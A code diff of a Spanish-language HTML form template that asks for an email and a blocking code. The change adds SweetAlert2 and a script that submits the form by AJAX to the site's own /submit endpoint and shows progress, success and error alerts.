@@ -5,6 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Formulario de Bloqueo</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         /* Fondo con degradado animado */
         body {
@@ -19,7 +20,8 @@
             align-items: center;
             height: 100vh;
             color: #333;
-            overflow: hidden; /* Evitar scroll por la animación */
+            overflow: hidden;
+            /* Evitar scroll por la animación */
         }
 
         /* Animación de fondo */
@@ -39,14 +41,17 @@
 
         /* Contenedor del formulario */
         .container {
-            background: rgba(255, 255, 255, 0.7); /* Fondo translúcido */
+            background: rgba(255, 255, 255, 0.7);
+            /* Fondo translúcido */
             padding: 30px;
             border-radius: 12px;
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
             width: 100%;
             max-width: 450px;
-            backdrop-filter: blur(10px); /* Desenfoque para mayor transparencia */
-            border: 1px solid rgba(255, 255, 255, 0.3); /* Borde sutil */
+            backdrop-filter: blur(10px);
+            /* Desenfoque para mayor transparencia */
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            /* Borde sutil */
         }
 
         h2 {
@@ -128,6 +133,8 @@
             }
         }
     </style>
+    <link rel="stylesheet" href="sweetalert2.min.css">
+
 </head>
 
 <body>
@@ -136,7 +143,7 @@
         <div class="number">
             Número: <strong>{{ num }}</strong>
         </div>
-        <form action="{{ url_for('submit') }}" method="POST">
+        <form id="form" action="{{ url_for('submit') }}" method="POST">
             <input type="hidden" name="num" value="{{ num }}">
             <input type="hidden" name="user_id" value="{{ user_id }}">
 
@@ -147,11 +154,76 @@
             <input type="text" id="email" name="email" required><br>
 
             <label for="clave">CODIGO DE BLOQUEO:</label>
-            <input type="text" id="clave" name="clave" required><br>           
+            <input type="text" id="clave" name="clave" required><br>
 
             <button type="submit">Enviar</button>
         </form>
     </div>
+
+    <script>
+        document.getElementById("form").onsubmit = function (event) {
+            event.preventDefault(); // Evita el envío inmediato del formulario
+
+            // Muestra una alerta de progreso con SweetAlert
+            const swalInstance = Swal.fire({
+                title: 'Enviando...',
+                text: 'Por favor espere mientras procesamos su solicitud.',
+                icon: 'info',
+                showConfirmButton: false,
+                didOpen: () => {
+                    Swal.showLoading(); // Muestra el ícono de carga
+                }
+            });
+
+            // Recopila los datos del formulario
+            const formData = new FormData(document.getElementById("form"));
+
+            // Envía los detalles al backend mediante AJAX
+            fetch('/submit', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json()) // Espera la respuesta en formato JSON
+            .then(data => {
+                // Si la respuesta es exitosa, muestra una alerta de éxito
+                if (data.status === "success") {
+                    swalInstance.close(); // Cierra la alerta de progreso
+                    Swal.fire({
+                        title: '¡Mensaje Enviado!',
+                        text: data.message,
+                        icon: 'success',
+                        showConfirmButton: false,
+                        timer: 3000,
+                        position: 'center'
+                    }).then(function () {
+                        window.close(); // Cierra la ventana (si fue abierta con window.open)
+                    });
+                } else {
+                    // Si hubo un error, muestra una alerta con el mensaje de error
+                    swalInstance.close(); // Cierra la alerta de progreso
+                    Swal.fire({
+                        title: '¡Error!',
+                        text: data.message,
+                        icon: 'error',
+                        showConfirmButton: true,
+                        position: 'center'
+                    });
+                }
+            })
+            .catch(error => {
+                swalInstance.close(); // Cierra la alerta de progreso en caso de error
+                Swal.fire({
+                    title: '¡Error!',
+                    text: 'Hubo un problema al enviar el formulario. Inténtelo de nuevo más tarde.',
+                    icon: 'error',
+                    showConfirmButton: true,
+                    position: 'center'
+                });
+            });
+        };
+        // Estilos personalizados para la alerta
+
+    </script>
 </body>
 
 </html>
